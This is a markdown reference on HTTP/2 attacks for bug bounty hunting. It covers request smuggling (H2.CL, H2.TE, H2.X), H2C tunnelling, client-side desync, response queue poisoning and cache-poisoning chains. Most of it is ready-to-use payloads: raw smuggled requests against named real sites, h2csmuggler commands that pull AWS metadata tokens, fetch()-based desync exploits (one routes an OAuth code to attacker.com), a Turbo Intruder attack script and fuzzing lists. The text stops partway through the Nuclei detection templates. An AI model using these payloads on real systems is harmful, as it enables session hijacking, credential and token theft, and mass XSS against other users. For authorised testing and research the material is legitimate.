# HTTP/2 Attacks Knowledgebase
## Research-Grade Bug Bounty & Black-Box Testing Reference

> **Version**: 1.0 | **Last Updated**: 2026-05-24
> **Sources**: PortSwigger Research, HackTricks, PayloadsAllTheThings, ProjectDiscovery, BishopFox, Assetnote, and community research.
> **Author**: Compiled for advanced bug bounty hunting and black-box penetration testing.

---

## Table of Contents

1. [Basics](#basics)
2. [HTTP/2 Theory](#http2-theory)
3. [HTTP/2 Frame Internals](#http2-frame-internals)
4. [Pseudo-Header Abuse](#pseudo-header-abuse)
5. [HTTP/2 Request Smuggling](#http2-request-smuggling)
6. [H2C Smuggling](#h2c-smuggling)
7. [HTTP/2 Desync Attacks](#http2-desync-attacks)
8. [Stream Confusion Attacks](#stream-confusion-attacks)
9. [Downgrade Attacks](#downgrade-attacks)
10. [Request Queue Poisoning](#request-queue-poisoning)
11. [Browser-Powered Desync Attacks](#browser-powered-desync-attacks)
12. [Cache Poisoning + HTTP/2 Chains](#cache-poisoning--http2-chains)
13. [OAuth + HTTP/2 Chains](#oauth--http2-chains)
14. [Request Smuggling + HTTP/2 Chains](#request-smuggling--http2-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [WAF Bypasses](#waf-bypasses)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What is HTTP/2?

HTTP/2 (RFC 7540/9113) is a binary, multiplexed protocol designed to reduce latency via:
- **Request/response multiplexing** over a single TCP connection
- **Header compression** via HPACK
- **Server push** (deprecated in practice)
- **Stream prioritization**

### Why HTTP/2 Changes the Attack Surface

Unlike HTTP/1.1's text-based parsing, HTTP/2 uses binary frames with explicit length fields. This eliminates classic CL.TE/TE.CL desync **within** HTTP/2 itself. However, **HTTP/2 downgrading** (converting H2 to H1) reintroduces and amplifies request smuggling risks.

### Key Differences from HTTP/1.1

| Feature | HTTP/1.1 | HTTP/2 |
|---------|----------|--------|
| Format | Text | Binary |
| Message Length | Content-Length / Transfer-Encoding | Frame length fields |
| Request Line | `METHOD /path HTTP/1.1` | Pseudo-headers (`:method`, `:path`) |
| Headers | Case-insensitive, text | Lowercase, binary (HPACK) |
| Connection | Multiple TCP connections | Single multiplexed connection |
| Newlines in Headers | Impossible | Possible (if not validated) |

---

## HTTP/2 Theory

### Connection Lifecycle

1. **Handshake**: HTTP/2 over TLS uses ALPN (`h2`). HTTP/2 cleartext (h2c) uses Upgrade header.
2. **Settings Exchange**: Both peers exchange SETTINGS frames.
3. **Stream Multiplexing**: Multiple streams (requests) share one connection.
4. **Flow Control**: Window-based flow control per stream and connection.

### Critical Implementation Flaws

- **Hidden HTTP/2**: Servers support H2 but do not advertise via ALPN. Clients default to H1, hiding attack surface.
- **First-Request Validation**: Proxies only validate the first request's Host header per connection.
- **First-Request Routing**: Proxies route all subsequent requests based on the first request's Host.

### Detection

```bash
# Force HTTP/2 despite ALPN
curl --http2 --http2-prior-knowledge https://target.com/

# Check ALPN advertisement
echo | openssl s_client -alpn h2 -connect target.com:443 | grep ALPN
```

---

## HTTP/2 Frame Internals

### Frame Structure

```
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31)                      |
+=+=============================================================+
|                   Payload (variable)                        |
+-------------------------------------------------------------+
```

### Critical Frame Types

| Type | ID | Purpose | Attack Relevance |
|------|-----|---------|------------------|
| HEADERS | 0x1 | Opens stream, carries headers | Pseudo-header injection |
| DATA | 0x0 | Carries request/response body | Body smuggling |
| SETTINGS | 0x4 | Configuration | Settings overflow |
| RST_STREAM | 0x3 | Aborts stream | Stream confusion |
| GOAWAY | 0x7 | Closes connection | Connection teardown |
| WINDOW_UPDATE | 0x8 | Flow control | Window exhaustion |
| CONTINUATION | 0x9 | Continues headers | Header fragmentation |

### Frame-Level Attacks

**DATA Frame Smuggling**: Send DATA frames after END_STREAM to append data to next request.

**RST_STREAM Race**: Send RST_STREAM immediately after HEADERS to confuse intermediaries.

**WINDOW_UPDATE Abuse**: Exhaust flow control windows to force connection closure patterns.

---

## Pseudo-Header Abuse

### The Five Pseudo-Headers

| Pseudo-Header | HTTP/1.1 Equivalent | Abuse Potential |
|----------------|---------------------|-----------------|
| `:method` | Request method | Method injection, request line splitting |
| `:path` | Request path + query | Path confusion, open redirect |
| `:authority` | Host header | Host header attacks, SSRF |
| `:scheme` | `http`/`https` | URL prefix injection, scheme confusion |
| `:status` | Status code (response only) | Response splitting |

### Attack Vectors

#### 1. Multiple `:path` Headers

Some servers process the first `:path`, others the last. This enables routing confusion:

```http
:method GET
:path /admin
:path /public
:authority target.com
```

#### 2. `:authority` vs `host` Header Confusion

HTTP/2 allows both `:authority` and `Host`. Servers may prioritize differently:

```http
:method GET
:path /
:authority legitimate.com
host attacker.com
```

#### 3. `:scheme` URL Prefix Injection

Netlify and others used `:scheme` to construct URLs without validation:

```http
:method GET
:path /ffx36.js
:authority start.mozilla.org
:scheme http://start.mozilla.org/xyz?
```

Downgraded result:
```http
GET /ffx36.js HTTP/1.1
Host: start.mozilla.org
```
But the server constructs: `http://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js`

#### 4. Request Line Injection via `:method`

Apache mod_proxy allowed spaces in `:method`:

```http
:method GET /admin HTTP/1.1
:path /fakepath
:authority target.com
```

Downgraded to:
```http
GET /admin HTTP/1.1 /fakepath HTTP/1.1
Host: target.com
```

This bypasses `<ProxyMatch "/admin"> Deny from all`.

#### 5. Header Name Splitting via Colons

Some servers allow colons in header names during downgrade:

```http
:method GET
:path /
:authority example.com
transfer-encoding: chunked: 
```

Becomes:
```http
GET / HTTP/1.1
Host: example.com
transfer-encoding: chunked: 
```

Better suited for Host-header attacks:
```http
:method GET
:path /
:authority example.com
host: psres.net: 443
```

Becomes:
```http
GET / HTTP/1.1
Host: example.com
Host: psres.net: 443
```

---

## HTTP/2 Request Smuggling

### Core Concept: H2 to H1 Downgrading

When a front-end speaks HTTP/2 with clients but forwards HTTP/1.1 to the back-end, protocol translation creates desync opportunities. The front-end uses HTTP/2's frame length, while the back-end uses HTTP/1.1's Content-Length or Transfer-Encoding.

### Attack Classes

| Class | Front-End | Back-End | Mechanism |
|-------|-----------|----------|-------------|
| **H2.CL** | HTTP/2 frame length | Content-Length | Malformed CL header |
| **H2.TE** | HTTP/2 frame length | Transfer-Encoding | Injected TE header |
| **H2.X** | HTTP/2 frame length | Request splitting | CRLF in headers |
| **H2.0** | HTTP/2 frame length | Ignores CL (treats as 0) | CL.0 variant |

### H2.CL Desync

The front-end uses HTTP/2's built-in length. The back-end uses a (malicious) Content-Length header.

**Netflix PoC (CVE-2021-21295)**:

```http
:method POST
:path /n
:authority www.netflix.com
content-length: 4

abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

Downgraded result:
```http
POST /n HTTP/1.1
Host: www.netflix.com
Content-Length: 4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
```

The back-end reads only 4 bytes (`abcd`), treating the rest as a new request.

### H2.TE Desync

The front-end ignores Transfer-Encoding (as HTTP/2 does not use it), but the back-end processes it after downgrade.

**AWS ALB / Verizon PoC**:

```http
:method POST
:path /identitfy/XUI
:authority id.b2b.oath.com
transfer-encoding: chunked

0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
```

Downgraded result:
```http
POST /identity/XUI HTTP/1.1
Host: id.b2b.oath.com
Content-Length: 66
Transfer-Encoding: chunked
0
GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10
x=
```

The back-end prioritizes Transfer-Encoding, sees chunk `0` (end), and treats `GET /oops...` as a new request.

### H2.TE via CRLF Injection

When front-ends strip `transfer-encoding: chunked` but do not validate header values:

```http
:method POST
:path /
:authority start.mozilla.org
foo: b\r\n\r\ntransfer-encoding: chunked

0\r\n\r\n\r\nGET / HTTP/1.1\r\n\r\nHost: evil-netlify-domain\r\n\r\nContent-Length: 5\r\n\r\n\r\nx=
```

During downgrade, the `\r\n` in the header value injects a new header:
```http
POST / HTTP/1.1
Host: start.mozilla.org
Foo: b
Transfer-Encoding: chunked
Content-Length: 71

0

GET / HTTP/1.1
Host: evil-netlify-domain
Content-Length: 5

x=
```

### H2.X via Request Splitting (Atlassian Jira)

Using double-CRLF to terminate the first request directly:

```http
:method GET
:path /
:authority ecosystem.atlassian.net
foo: bar\r\n\r\nHost: ecosystem.atlassian.net\r\n\r\nGET /robots.txt HTTP/1.1\r\n\r\nX-Ignore: x
```

The front-end adds its own `\r\n\r\n`, creating two complete requests:
```http
GET / HTTP/1.1
Foo: bar
Host: ecosystem.atlassian.net

GET /robots.txt HTTP/1.1
X-Ignore: x
Host: ecosystem.atlassian.net
```

**Result**: Response queue poisoning - each user receives the previous user's response.

### Request Line Injection via Pseudo-Headers

```http
:method GET / HTTP/1.1\r\n\r\nTransfer-encoding: chunked\r\n\r\nx: x
:path /ignored
:authority ecosystem.atlassian.net
```

Downgraded:
```http
GET / HTTP/1.1
transfer-encoding: chunked
x: x /ignored HTTP/1.1
Host: eco.atlassian.net
```

---

## H2C Smuggling

### Concept

H2C (HTTP/2 Cleartext) allows upgrading an HTTP/1.1 connection to HTTP/2 without TLS. If a reverse proxy forwards the `Upgrade: h2c` header to a back-end that supports H2C, the attacker can establish a direct HTTP/2 tunnel through the proxy, bypassing all proxy rules (path-based routing, authentication, WAF).

### Required Headers (RFC)

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

### Attack Flow

1. Attacker sends HTTP/1.1 request with H2C upgrade headers to proxy
2. Proxy forwards upgrade to back-end
3. Back-end responds with `101 Switching Protocols`
4. Proxy forwards 101 to attacker
5. **TCP tunnel established** - attacker now speaks HTTP/2 directly to back-end
6. All subsequent HTTP/2 frames bypass proxy rules entirely

### Exploitation Scenarios

**Bypassing path restrictions**:
```bash
# Proxy blocks /flag, but H2C tunnel bypasses it
./h2csmuggler.py -x https://edgeserver http://backend/flag
```

**Brute-forcing internal endpoints via HTTP/2 multiplexing**:
```bash
./h2csmuggler.py -x https://edgeserver -i dirs.txt http://localhost/
```

**Host header SSRF (AWS IMDSv2)**:
```bash
# Retrieve token
./h2csmuggler.py -x https://edgeserver -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token

# Access metadata
./h2csmuggler.py -x https://edgeserver \
  -H "x-aws-ec2-metadata-token: TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**Spoofing internal headers**:
```bash
./h2csmuggler.py -x https://edgeserver \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 172.16.0.1" \
  http://backend/system/dashboard
```

### Non-Compliant Upgrades

Some back-ends accept non-compliant upgrades (missing `HTTP2-Settings`):
```bash
./h2csmuggler.py --upgrade-only -x https://target.com --test
```

---

## HTTP/2 Desync Attacks

### CL.0 / H2.0 Desync

When the back-end simply ignores Content-Length (equivalent to CL: 0):

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

The back-end ignores CL, treats the body as the start of the next request. This was browser-compatible on amazon.com.

### Pause-Based Desync

Pausing mid-request triggers misguided timeout implementations:

**Varnish synth() timeout**:
1. Send headers promising a body
2. Wait for server timeout (e.g., 15 seconds)
3. Server sends response but leaves connection open
4. Send body - interpreted as a new request

```python
# Turbo Intruder script concept
engine=Engine.BURP2
requestsPerConnection=100
```

### Client-Side Desync (CSD)

The victim's browser becomes the attack delivery platform. The desync occurs between browser and front-end.

**Requirements**:
1. Server ignores Content-Length on specific endpoints (typically static files, redirects)
2. Request must be triggerable cross-domain from browser
3. Target should prefer HTTP/1.1 (or attacker forces it via proxy/VPN)

**Basic CSD Probe**:
```javascript
fetch('https://example.com/favicon.ico', {
    method: 'POST',
    body: "GET /404 HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

**Akamai - Stacked HEAD Exploit**:
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: "HEAD /404/?cb=" + Date.now() + " HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y",
    credentials: 'include',
    mode: 'cors'  // throw error instead of following redirect
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})
```

**Cisco WebVPN - Client-Side Cache Poisoning**:
```javascript
fetch('https://redacted/+webvpn+/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://redacted/+CSCOE+/win.js'
})
```

---

## Stream Confusion Attacks

### Concept

HTTP/2 multiplexes multiple streams over one connection. If stream handling is flawed, responses can be mapped to wrong requests.

### RST_STREAM Abuse

Send RST_STREAM immediately after HEADERS to cause stream state confusion:

```
HEADERS frame (stream 1, opens request)
RST_STREAM frame (stream 1, cancels it)
HEADERS frame (stream 3, new request)
```

Some servers may process stream 1's request but send the response on stream 3's channel.

### Priority Confusion

HTTP/2 priority frames can manipulate stream scheduling. If a server prioritizes streams incorrectly, it may serve responses out of order or mix stream contexts.

### Stream ID Exhaustion

Rapidly opening/closing streams to exhaust stream IDs and force connection reset, potentially resetting security state.

---

## Downgrade Attacks

### HTTP/2 to HTTP/1.1 Downgrade

The root cause of most HTTP/2 request smuggling. Front-end speaks H2, back-end speaks H1.

**Detection**:
```bash
# Check if server downgrades
# Send H2 request with suspicious headers, observe H1-style errors in response
```

### TLS to Cleartext Downgrade

Forcing a connection from HTTPS to HTTP via:
- `Upgrade-Insecure-Requests` manipulation
- `:scheme` pseudo-header set to `http`
- H2C upgrade over TLS-terminated connections

### ALPN Stripping

Servers that support H2 but do not advertise it via ALPN. Force H2 with `--http2-prior-knowledge`.

---

## Request Queue Poisoning

### Concept

Smuggling a **complete** request (not just a prefix) causes the front-end to have one extra response. This desynchronizes the response queue, causing users to receive each other's responses.

### H2.TE Response Queue Poisoning

```http
POST /x HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: target.com

```

**Attack Flow**:
1. Send poison request - you get 404 (your own request)
2. Wait 5 seconds
3. Send again - if you receive 302, you have captured another user's response (e.g., admin login)
4. Extract session cookie from captured response
5. Access `/admin` with stolen cookie

### Response Queue Poisoning via H2.X

Smuggling exactly 2 requests causes indefinite queue desync:

```
Req1 -> Resp1 (attacker gets)
Req2 -> (attacker's smuggled request)
Req3 -> Resp2 (victim gets attacker's smuggled response)
Req4 -> Resp3 (next victim gets previous victim's response)
...indefinitely...
```

**Atlassian Jira case**: Some responses contained `Set-Cookie` headers that persistently logged users into other users' accounts.

---

## Browser-Powered Desync Attacks

### Overview

Browser-powered desync attacks turn the victim's browser into a desync delivery platform. This enables:
- Attacking single-server websites (no proxy required)
- Attacking internal networks via victim browsers
- Self-replicating "desync worms"

### Attack Classes

| Class | Target | Mechanism |
|-------|--------|-----------|
| **Client-Side Desync** | Browser <-> Front-end | Browser sends desync request, poisons connection pool |
| **Browser-Powered Server-Side Desync** | Front-end <-> Back-end | Browser-compatible request causes server-side desync |
| **Pause-Based Desync** | Server timeout logic | Pausing triggers timeout that leaves connection poisoned |

### Desync Worm Concept

1. Attacker infects victim A via XSS/CSD
2. Victim A's browser executes JavaScript that re-launches the attack
3. Victim A infects victim B, who infects victim C, etc.
4. No user interaction required after initial infection

**Amazon.com missed opportunity**: The H2.0 desync was so vanilla that `fetch()` could trigger it. A desync worm was theoretically possible.

### Connection State Attacks

**First-Request Validation Bypass**:
```http
GET / HTTP/1.1
Host: allowed.comGET / HTTP/1.1
Host: intranet.target.com
```

Proxy only validates first request's Host, allowing access to internal sites.

**First-Request Routing**:
```http
GET / HTTP/1.1
Host: example.com    POST /pwreset HTTP/1.1
Host: psres.net
```

All subsequent requests routed to example.com's back-end, enabling password reset poisoning.

---

## Cache Poisoning + HTTP/2 Chains

### Web Cache Poisoning via H2 Downgrade

1. Identify cacheable endpoint (e.g., `/resources/js/tracking.js`)
2. Use H2.CL or H2.TE to smuggle a redirect:

```http
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /resources/js HTTP/1.1
Host: exploit-server.net
Content-Length: 25

smuggled=yes
```

3. Victim's request for `/resources/js/tracking.js` gets redirected to attacker server
4. Attacker serves malicious JavaScript
5. Cache stores the malicious redirect/response
6. All subsequent users receive the poisoned JavaScript

### Cache Poisoning + Request Tunnelling

Using HEAD to mix headers and bodies:

```http
:method HEAD
:path /blog/?x=dontpoisoneveryone
:authority bitbucket.org
foo: bar\r\n\r\nHost: x\r\n\r\nGET /wp-admin?<svg/onload=alert(1)> HTTP/1.1\r\n\r\nHost: bitbucket.wpengine.com
```

Response pairs 404 headers with 301 body containing XSS.

### Web Cache Deception++

Using request smuggling to trick cache into storing sensitive data:

```http
POST / HTTP/1.1
Transfer-Encoding: blah
0
GET /account/settings HTTP/1.1
X: X
GET /static/site.js HTTP/1.1
Cookie: sessionid=xyz
```

Victim's account details get cached over `/static/site.js`.

---

## OAuth + HTTP/2 Chains

### OAuth Code Theft via Request Smuggling

When redirecting OAuth callbacks:

```http
POST / HTTP/2
Host: id.b2b.oath.com
Content-Length: 4

abcdGET /b2blanding/show/oops HTTP/1.1
Host: psres.net
```

Victim's OAuth callback gets redirected to attacker, leaking `code` parameter via Referer:
```http
GET /b2blanding/show/oops HTTP/1.1
Host: psres.net
Referer: https://id.b2b.oath.com/?...&code=secret
```

### OAuth + CSD Chain

Using client-side desync to steal OAuth tokens from internal OAuth flows:

```javascript
fetch('https://internal-oauth.company.com/robots.txt', {
    method: 'POST',
    body: "GET /callback?code=STOLEN HTTP/1.1\r\nHost: attacker.com\r\nX: Y",
    credentials: 'include'
})
```

---

## Request Smuggling + HTTP/2 Chains

### Classic Chains

| Vulnerability | Chained With | Result |
|--------------|--------------|--------|
| H2.CL/H2.TE | Reflected XSS | Mass XSS exploitation |
| H2.CL/H2.TE | Open Redirect | Account takeover via JS imports |
| H2.CL/H2.TE | DOM Open Redirect | Server-side + DOM redirect chain |
| H2.X | Response Queue Poisoning | Session hijacking, PII exposure |
| Request Tunnelling | Internal Header Leak | Privilege escalation |
| Request Tunnelling | Cache Poisoning | Persistent XSS |

### Netflix Exploitation Chain

1. H2.CL desync on `www.netflix.com`
2. Redirect JavaScript includes to attacker server
3. Execute malicious JavaScript in victim's browser
4. Steal passwords and credit card numbers
5. Run in loop to compromise all active users

### PayPal Exploitation Chain

1. Request smuggling + cache poisoning on `c.paypal.com`
2. Poison `fb-all-prod.pp2.min.js`
3. CSP blocks direct execution...
4. ...but login page loads sub-page in iframe without CSP
5. Sub-page imports poisoned JS
6. Gareth Heyes finds `paypal.com/us/gifts` without CSP
7. Redirect iframe to that page, gain parent access
8. Steal plaintext passwords from Safari/IE users

---

## Parser Confusion Payloads

### Transfer-Encoding Obfuscation

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding\n: chunked
```

### HTTP/2 Header Smuggling Techniques

| Technique | Payload | Target |
|-----------|---------|--------|
| **Space suffix** | `transfer-encoding : chunked` | Front-ends that strip spaces |
| **Underscore** | `transfer_encoding: chunked` | CGI-inspired back-ends |
| **Newline in value** | `foo: bar\r\ntransfer-encoding: chunked` | CRLF injection during downgrade |
| **Unicode** | `tran\u017ffer-encoding: chunked` | Unicode-aware uppercase conversion |
| **Unicode K** | `chun\u212aed` | Unicode-aware lowercase conversion |
| **Tab** | `Transfer-Encoding:\tchunked` | Tab-tolerant parsers |
| **Multiple** | Duplicate `Transfer-Encoding` headers | Header-priority confusion |

### Content-Length Confusion

```http
Content-Length: 0
Content-Length: 5
Content-Length: -1
Content-Length: \r\n
Content-Length\r\n: 5
```

---

## Browser Quirks

### Connection Pools

Chrome maintains **two separate connection pools**:
1. **With-cookies pool**: Used for navigations, authenticated requests
2. **Without-cookies pool**: Used for `no-cors`, anonymous requests

**Critical**: Always use `credentials: 'include'` when poisoning for navigation attacks.

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. This affects HEAD-based desync techniques.

**Mitigation**: Use cache-busters to delay responses, ensuring the browser does not over-read.

### CORS and Redirect Handling

```javascript
// Use mode: 'cors' to intentionally trigger CORS error
// This prevents browser from following redirect
fetch('https://target.com/redirect', {
    method: 'POST',
    body: smuggledRequest,
    mode: 'cors'
}).catch(() => {
    // Navigate to trigger poisoned connection
    location = 'https://target.com/'
})
```

### Mixed Content Handling

- **Chrome/ Firefox**: Block HTTP content on HTTPS pages
- **Internet Explorer**: Mixed-content protection can be bypassed
- **Safari**: Auto-upgrades to HTTPS if target is in HSTS cache

### Cache Partitioning

Modern browsers partition caches by origin. Top-level navigation is required to poison the correct cache partition.

---

## Gadget Chains

### Reflection Gadgets

Find endpoints that reflect POST parameters to leak internal headers:

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 142
Transfer-Encoding: chunked

0
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

login[email]=asdf
```

Response reflects victim's full request including internal headers:
```
X-Forwarded-For: 81.139.39.150
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
```

### Storage Gadgets

Store victim's request in attacker-accessible location:

```http
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 49

f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```

### Redirect Gadgets

Use Host-header redirects to hijack JavaScript imports:

```http
POST /etc/libs/xyz.js HTTP/1.1
Host: redacted
Content-Length: 57
Transfer-Encoding: chunked

0
POST /etc HTTP/1.1
Host: burpcollaborator.net
X: X
```

Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://burpcollaborator.net/etc/
```

### HEAD Splicing Gadget

Use HEAD to combine headers from one response with body from another:

```http
HEAD /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked

0
POST / HTTP/1.1
...
```

Back-end returns only headers for first response, including Content-Length for undelivered body, causing front-end to over-read.

---

## Real World Case Studies

### Netflix (H2.CL) - $20,000
- **Vulnerability**: H2.CL desync via incorrect Content-Length
- **Impact**: Account hijacking, password/credit card theft
- **Root Cause**: Netty HTTP/2 downgrade (CVE-2021-21295)
- **Technique**: Redirect JavaScript includes via smuggled prefix

### Verizon / AWS ALB (H2.TE) - $7,000 + $10,000
- **Vulnerability**: H2.TE desync on AWS ALB
- **Impact**: OAuth code theft, credential harvesting
- **Technique**: `transfer-encoding: chunked` accepted despite RFC prohibition
- **Note**: AWS patched ALB; no bounty program

### Netlify CDN (H2.TE via CRLF) - $4,000
- **Vulnerability**: CRLF injection in header values during downgrade
- **Impact**: Full cache control over all Netlify sites
- **Target**: `start.mozilla.org` (Firefox start page)
- **Technique**: `\r\n` in header value injected `Transfer-Encoding: chunked`

### Atlassian Jira (H2.X) - $15,000
- **Vulnerability**: Request splitting via double-CRLF
- **Impact**: Response queue poisoning, session mixing
- **Root Cause**: PulseSecure Virtual Traffic Manager
- **Hotfix Bypasses**: Colons in header names, request line injection, `\n` without `\r\n`

### Bitbucket (Request Tunnelling) - Multi-month effort
- **Vulnerability**: Blind request tunnelling
- **Discovery**: HEAD method technique after 4 months
- **Impact**: Persistent XSS on all pages via cache poisoning
- **Technique**: Internal header leaking via body-start confusion

### Amazon.com (H2.0 / CL.0)
- **Vulnerability**: Back-end ignored Content-Length on `/b/`
- **Impact**: Request storage in attacker's shopping list
- **Browser Compatibility**: Fully browser-compatible via `fetch()`
- **Missed Opportunity**: Desync worm potential

---

## Fuzzing Payloads

### HTTP/2 Header Fuzzing

```
:method GET\r\nPOST
:path /\r\n/admin
:authority target.com\r\nattacker.com
:scheme https\r\nhttp
:status 200
```

### Body Injection Payloads

```
GET / HTTP/1.1\r\nHost: x\r\n\r\n
POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 5\r\n\r\npwned
HEAD /admin HTTP/1.1\r\nHost: x\r\n\r\n
```

### Chunked Encoding Mutations

```
0\r\n\r\n
0\r\nX: Y\r\n\r\n
0000000000\r\n\r\n
0;comment\r\n\r\n
\r\n0\r\n\r\n
```

### Character Encoding Tests

```
Transfer-Encoding: chunKed
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Content-Length: 0\r\nContent-Length: 5
```

---

## Automation Workflows

### HTTP Request Smuggler + Burp Suite

```
1. Install HTTP Request Smuggler from BApp Store
2. Right-click request -> "Launch Smuggle probe"
3. Wait for "Completed 1 of 1" in output tab
4. If vulnerable: Right-click -> "Smuggle attack (CL.TE/TE.CL)"
5. Edit 'prefix' variable in Turbo Intruder script
6. Click Attack
```

### Turbo Intruder HTTP/2 Script

```python
# Turbo Intruder H2 script template
from burp import *

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          engine=Engine.BURP2)  # Use Burp's H2 stack

    # Character mappings for H2 attacks:
    # ^ -> \r
    # ~ -> \n
    # ` -> :

    attack = "POST / HTTP/2\nHost: target.com\nContent-Length: 0\n\nGET /admin HTTP/1.1\nHost: target.com\n"

    for i in range(100):
        engine.queue(attack)

def handleResponse(req, interesting):
    table.add(req)
```

### http2smugl Detection

```bash
# Install
go install github.com/neex/http2smugl@latest

# Detect vulnerability
http2smugl detect https://target.com

# Send custom malformed request
http2smugl request https://target.com \
  "foo: bar\r\ntransfer-encoding: chunked" \
  "content-length: 0"
```

### h2csmuggler Scanning

```bash
# Scan list of endpoints
./h2csmuggler.py --scan-list urls.txt --threads 5

# Test single endpoint
./h2csmuggler.py -x https://target.com/api/ --test

# Exploit with custom headers
./h2csmuggler.py -x https://edgeserver \
  -H "X-Custom-Header: value" \
  http://backend/internal
```

### Smuggler (Python)

```bash
# Single target
python3 smuggler.py -u https://target.com/

# Multiple targets
cat urls.txt | python3 smuggler.py

# Custom method
python3 smuggler.py -u https://target.com/ -m GET

# Custom config (more mutations)
python3 smuggler.py -u https://target.com/ -c exhaustive.py
```

---

## Recon Methodology

### Step 1: Identify HTTP/2 Support

```bash
# Check ALPN
echo | openssl s_client -alpn h2 -connect target.com:443 2>/dev/null | grep ALPN

# Force H2 with curl
curl --http2 --http2-prior-knowledge -I https://target.com/

# Check HTTP/2 cleartext (h2c)
curl -I http://target.com/ -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" -H "Connection: Upgrade, HTTP2-Settings"
```

### Step 2: Detect Downgrading

```bash
# Send H2 request with Content-Length: 0 and body
# If body is processed despite CL:0, downgrading may be occurring

# Send H2 request with Transfer-Encoding: chunked
# If accepted, likely vulnerable to H2.TE
```

### Step 3: Identify Proxy Chain

```bash
# Check Server headers
# Look for: cloudflare, nginx, awselb, AkamaiGHost, etc.

# Check Via headers
# Look for proxy identifiers

# Test connection reuse
# Send multiple requests, check Connection-ID in responses
```

### Step 4: Find Desync Vectors

```bash
# Test static endpoints for CL.0
POST /favicon.ico HTTP/2
Host: target.com
Content-Length: 5

X

# Test redirects for body ignoring
POST /redirect HTTP/2
Host: target.com
Content-Length: 20

GET /admin HTTP/1.1

```

### Step 5: Internal Header Discovery

```bash
# Use Param Miner to guess internal headers
# Use request tunnelling to bypass front-end rewriting
# Use reflection gadgets to leak headers
```

### Step 6: Cache Analysis

```bash
# Check cache headers: Age, Cache-Control, X-Cache
# Test cache key with cache busters
# Identify cacheable endpoints
```

---

## Nuclei Templates

### Basic CL.TE Detection

```yaml
id: cl-te-smuggling

info:
  name: CL.TE HTTP Request Smuggling
  author: pdteam
  severity: critical
  description: |
    Detects CL.TE HTTP request smuggling vulnerability.
    Front-end uses Content-Length, back-end uses Transfer-Encoding.

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked

        5c
        GPOST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15

        x=1
        0


    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Unrecognised method GPOST")'
        condition: and
```

### H2C Smuggling Detection

```yaml
id: h2c-smuggling

info:
  name: H2C Request Smuggling
  author: pdteam
  severity: critical
  description: |
    Detects H2C upgrade support that may allow request smuggling.

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Upgrade: h2c
        HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
        Connection: Upgrade, HTTP2-Settings

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 101'
          - 'contains(header, "Switching Protocols")'
        condition: and
```

### HTTP/2 Downgrade Detection

```yaml
id: http2-downgrade-smuggling

info:
  name: HTTP/2 Downgrade Request Smuggling
  author: pdteam
  severity: critical
